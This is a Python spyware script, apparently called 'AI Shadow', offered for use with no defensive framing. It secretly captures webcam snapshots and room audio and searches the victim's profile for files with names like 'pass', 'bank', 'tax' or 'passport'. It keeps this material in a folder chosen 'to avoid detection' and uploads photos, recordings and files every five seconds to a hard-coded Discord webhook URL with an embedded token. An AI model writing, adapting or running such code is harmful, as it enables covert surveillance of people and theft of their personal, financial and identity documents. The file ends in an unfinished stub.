import ctypes, os, cv2, time, requests, shutil
import sounddevice as sd
from scipy.io.wavfile import write

# --- CONFIGURATION ---
# Your unique Discord Webhook URL
WEBHOOK_URL = "https://discordapp.com/ap/webhooks/1492961145043026092/zI-T3AHkZ-W73K7Yz0hQsa8A62hyIUXWAM9CVEEL8T3InKZB1MxWZsi_uwKHXpK3FAu3"
IDLE_THRESHOLD = 10 
# Hidden local storage in the Public folder to avoid detection
LOOT_DIR = "C:\\Users\\Public\\Log_Cache"

if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

# --- 1. THE BRAIN: IDLE DETECTOR ---
def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lii = LASTINPUTINFO(); lii.cbSize = ctypes.sizeof(lii)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0

# --- 2. THE EYES: SILENT CAMERA ---
def capture_camera():
    path = os.path.join(LOOT_DIR, "sys_snap.jpg")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(path, frame)
    cam.release()
    return path

# --- 3. THE SCOUT: FILE THIEF ---
def scout_files():
    # Targeted search paths for sensitive details
    paths = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Videos"]]

    keywords = ["pass", "bank", "secret", "tax", "passport"]
    loot_found = []
    for path in paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                if any(k in file.lower() for k in keywords):
                    loot_found.append(os.path.join(root, file))
    # print(loot_found)
    return loot_found

# --- 4. THE EARS: AUDIO RECORDER ---
def record_audio():
    path = os.path.join(LOOT_DIR, "room_mic.wav")
    try:
        fs = 44100
        duration = 5 # Records room audio for 5 seconds
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait() 
        write(path, fs, recording)
        return path
    except Exception:
        return None

# --- 5. THE DELIVERY: SEND ALL DETAILS ---
def send_all_details(photo, audio, files):
    # Send Snapshot
    with open(photo, "rb") as p:
        requests.post(WEBHOOK_URL, files={"file": p}, data={"content": "📸 Snapshot Captured!"})
    
    # Send Audio (only if recorded successfully)
    if audio and os.path.exists(audio):
        with open(audio, "rb") as a:
            requests.post(WEBHOOK_URL, files={"file": a}, data={"content": "🎤 Room Audio Captured!"})
    
    # Send Actual Files (not just paths)
    if files:
        for file_path in files[:5]:  # Send up to 5 files
            try:
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, "rb") as f:
                        file_name = os.path.basename(file_path)
                        requests.post(WEBHOOK_URL, files={"file": f}, data={"content": f"📄 Sensitive File: {file_name}"})
            except Exception as e:
                print(f"Failed to send file {file_path}: {e}")

# --- MAIN LOOP ---
while True:
    print("AI Shadow activating...")
    p_path = capture_camera()
    a_path = record_audio()
    s_files = scout_files()
    
    send_all_details(p_path, a_path, s_files)
    
    # Capture and record every 5 seconds, regardless of idle status
    time.sleep(5)


def main():
    print("hack script running")    
    # --- CONFIGURATION ---
